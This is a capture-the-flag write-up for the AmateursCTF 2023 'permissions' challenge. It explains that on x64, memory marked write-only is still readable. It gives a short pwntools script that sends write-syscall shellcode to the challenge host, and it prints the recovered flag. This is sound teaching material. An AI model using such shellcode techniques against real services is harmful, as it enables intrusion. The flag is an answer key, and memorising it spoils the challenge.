# AmateursCTF 2023

## permissions

> Every programmer should read the [`Intel Software Developer Manuals`[https://cdrdv2.intel.com/v1/dl/getContent/671200] at least once.
>
>  Author: unvariant
>
> [`chal.c`](chal.c) [`chal`](chal) [`Dockerfile`](Dockerfile)

Tags: _pwn_

## Solution
For this challenge a bit of code is given.

```c
int main () {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    alarm(6);

    int fd = open("flag.txt", O_RDONLY);
    if (0 > fd)
        errx(1, "failed to open flag.txt");

    char * flag = mmap(NULL, 0x1000, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (flag == MAP_FAILED)
        errx(1, "failed to mmap memory");

    if (0 > read(fd, flag, 0x1000))
        errx(1, "failed to read flag");

    close(fd);

    // make flag write-only
    if (0 > mprotect(flag, 0x1000, PROT_WRITE))
        errx(1, "failed to change mmap permissions");

    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (code == MAP_FAILED)
        errx(1, "failed to mmap shellcode buffer");

    printf("> ");
    if (0 > read(0, code, 0x100000))
        errx(1, "failed to read shellcode");

    setup_seccomp();

    ((void(*)(char *))code)(flag);
    exit(0);
}
```

What happens here is that the flag is read into a anonymous, private memory file. After the flag was written the memory is made `write only` by calling `mprotect` with `PROT_WRITE`. Afterwards another chunk of memory is allocated (with rwx permission) and some user input is read. The user input is assumed to be shellcode since it's called just before exiting with `flag` pointer as parameter.

```c
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
```

Working around this issue by trying to call `system` to get a shell or call `cat` will not work, since most of the syscalls are forbidden. Allowed are only `read`, `write`, `exit` and `exit_group`.

Another hint given is the [`Intel Software Developer Manuals`](https://cdrdv2.intel.com/v1/dl/getContent/671200). As this code runs on `x64` write permission always imply read, so the solution is to just print the flag content.

When running with gdb we can see that the flag pointer is read to rax and passed via rdi. So calling syscall `write` with one of the two registers and printing to `fd = 1` should give us the flag. 

```
x55ae2bc5054b <main+452>       mov    rdx, qword ptr [rbp - 0x18]
0x55ae2bc5054f <main+456>      mov    rax, qword ptr [rbp - 0x10]
0x55ae2bc50553 <main+460>      mov    rdi, rax
► 0x55ae2bc50556 <main+463>    call   rdx                           <0x7f699189b000>
```

```python
from pwn import *

context.arch = "amd64"

p = remote("amt.rs", 31174)

shellcode = '''
    mov rsi, rdi
    push 1
    pop rdi
    push 40
    pop rdx
    push SYS_write
    pop rax
    syscall
'''

p.sendlineafter(b"> ", asm(shellcode))
p.interactive()
```

```bash
$ python foo.py
[+] Opening connection to amt.rs on port 31174: Done
[*] Switching to interactive mode
amateursCTF{exec_1mpl13s_r34d_8751fda0}
```

Flag `amateursCTF{exec_1mpl13s_r34d_8751fda0}`